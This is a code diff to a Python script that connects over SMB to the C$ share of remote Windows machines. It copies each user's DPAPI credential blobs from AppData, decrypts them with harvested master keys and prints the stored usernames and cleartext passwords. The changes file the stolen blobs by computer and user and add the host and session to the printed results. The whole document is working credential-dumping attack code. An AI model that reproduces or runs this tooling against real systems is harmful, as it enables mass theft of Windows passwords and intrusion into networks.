@@ -189,6 +189,8 @@ def main():
 
 
 
+
+
 	# creating folders to store blob and mkf
 	if options.debug is True or options.debugmax is True:
 		print("Creating structure folders to store blob and mkf...")
@@ -203,7 +205,7 @@ def main():
 	if not os.path.exists(blobFolder):
 	    os.mkdir(blobFolder)
 	if not os.path.exists(mkfFolder):
-	    os.mkdir(mkfFolder)
+		os.mkdir(mkfFolder)
 
 
 
@@ -246,7 +248,13 @@ def main():
 						if blob_file != "." and blob_file != "..":
 							# create and retrieve the credential blob
 							count_blobs = count_blobs + 1
-							wf = open(blobFolder + "/" + blob_file,'wb')
+							computer_folder = blobFolder + "/" + str(current_computer)
+							if not os.path.exists(computer_folder):
+								os.mkdir(computer_folder)
+							user_folder = computer_folder + "/" + str(current_user[0])
+							if not os.path.exists(user_folder):
+								os.mkdir(user_folder)
+							wf = open(user_folder + "/" + blob_file,'wb')
 							smbClient.getFile("C$", "\\users\\" + current_user[0] + "\\appData\\Roaming\\Microsoft\\Credentials\\" + blob_file, wf.write)
 							is_there_any_blob_for_this_user = True
 					response = smbClient.listPath("C$", "\\users\\" + current_user[0] + "\\appData\\Local\\Microsoft\\Credentials\\*")
@@ -255,7 +263,13 @@ def main():
 						if blob_file != "." and blob_file != "..":
 							# create and retrieve the credential blob
 							count_blobs = count_blobs + 1
-							wf = open(blobFolder + "/" + blob_file,'wb')
+							computer_folder = blobFolder + "/" + str(current_computer)
+							if not os.path.exists(computer_folder):
+								os.mkdir(computer_folder)
+							user_folder = computer_folder + "/" + str(current_user[0])
+							if not os.path.exists(user_folder):
+								os.mkdir(user_folder)
+							wf = open(user_folder + "/" + blob_file,'wb')
 							smbClient.getFile("C$", "\\users\\" + current_user[0] + "\\appData\\Local\\Microsoft\\Credentials\\" + blob_file, wf.write)
 							is_there_any_blob_for_this_user = True
 					if is_there_any_blob_for_this_user is True:
@@ -362,44 +376,52 @@ def main():
 		if options.debug is True:
 			print("Starting blob decryption with MKF keys...")
 		array_of_credentials = []
-		for filename in os.listdir(blobFolder):
-			try:
-				fp = open(blobFolder + "/" + filename, 'rb')
-				data = fp.read()
-				cred = CredentialFile(data)
-				blob = DPAPI_BLOB(cred['Data'])				
+		for current_computer in os.listdir(blobFolder):
+			current_computer_folder = blobFolder + "/" + current_computer
+			if current_computer != "." and current_computer != ".." and os.path.isdir(current_computer_folder):
+				for username in os.listdir(current_computer_folder):
+					current_user_folder = current_computer_folder + "/" + username
+					if username != "." and username != ".." and os.path.isdir(current_user_folder):
+						for filename in os.listdir(current_user_folder):
+							try:
+								fp = open(current_user_folder + "/" + filename, 'rb')
+								data = fp.read()
+								cred = CredentialFile(data)
+								blob = DPAPI_BLOB(cred['Data'])				
 
-				if options.debugmax is True:
-					print("Starting decryption of blob " + filename + "...")
+								if options.debugmax is True:
+									print("Starting decryption of blob " + filename + "...")
 
-				for mkf_key in array_of_mkf_keys:
-					try:
-						decrypted = blob.decrypt(mkf_key)
-						if decrypted is not None:
-							creds = CREDENTIAL_BLOB(decrypted)
-							tmp_cred = {}
-							tmp_cred['lastwritten'] = datetime.utcfromtimestamp(getUnixTime(creds['LastWritten']))
-							tmp_cred['target'] = creds['Target'].decode('utf-16le')
-							tmp_cred["username"] = creds['Username'].decode('utf-16le')
-							tmp_cred["password1"] = creds['Unknown'].decode('utf-16le') 
-							tmp_cred["password2"] = str( creds['Unknown3'].decode('utf-16le') ) 
-							if options.md5 is True:
-								if len(creds['Unknown'].decode('utf-16le')) > 0:
-									tmp_cred["password1"] = hashlib.md5(str( creds['Unknown'].decode('utf-16le')  ).encode('utf-8')).hexdigest()
-								tmp_cred["password2"] = hashlib.md5(str( creds['Unknown3'].decode('utf-16le')  ).encode('utf-8')).hexdigest()
-							array_of_credentials.append(tmp_cred)
-					except:
-						if options.debugmax is True:
-							print("Error occured while decrypting blob file.")
-							import traceback
-							traceback.print_exc()
-						pass
-			except:
-				if options.debugmax is True:
-					print("Error occured while decrypting blob file.")
-					import traceback
-					traceback.print_exc()
-				pass
+								for mkf_key in array_of_mkf_keys:
+									try:
+										decrypted = blob.decrypt(mkf_key)
+										if decrypted is not None:
+											creds = CREDENTIAL_BLOB(decrypted)
+											tmp_cred = {}
+											tmp_cred['foundon'] = str(current_computer)
+											tmp_cred['inusersession'] = str(username)
+											tmp_cred['lastwritten'] = datetime.utcfromtimestamp(getUnixTime(creds['LastWritten']))
+											tmp_cred['target'] = creds['Target'].decode('utf-16le')
+											tmp_cred["username"] = creds['Username'].decode('utf-16le')
+											tmp_cred["password1"] = creds['Unknown'].decode('utf-16le') 
+											tmp_cred["password2"] = str( creds['Unknown3'].decode('utf-16le') ) 
+											if options.md5 is True:
+												if len(creds['Unknown'].decode('utf-16le')) > 0:
+													tmp_cred["password1"] = hashlib.md5(str( creds['Unknown'].decode('utf-16le')  ).encode('utf-8')).hexdigest()
+												tmp_cred["password2"] = hashlib.md5(str( creds['Unknown3'].decode('utf-16le')  ).encode('utf-8')).hexdigest()
+											array_of_credentials.append(tmp_cred)
+									except:
+										if options.debugmax is True:
+											print("Error occured while decrypting blob file.")
+											import traceback
+											traceback.print_exc()
+										pass
+							except:
+								if options.debugmax is True:
+									print("Error occured while decrypting blob file.")
+									import traceback
+									traceback.print_exc()
+								pass
 		if len(array_of_credentials) > 0:
 			if options.debug is True:
 				print(str(len(array_of_credentials)) + " credentials have been decrypted !\n\n")
@@ -408,6 +430,8 @@ def main():
 				if i == 0:
 					print("***********************************************")
 					i = i + 1
+				print("Found on : " + str(credential['foundon']))
+				print("Session username : " + str(credential['inusersession']))
 				print("LastWritten : " + str(credential['lastwritten']))
 				print("Target : " + str(credential['target']))
 				print("Username : " + str(credential['username']))
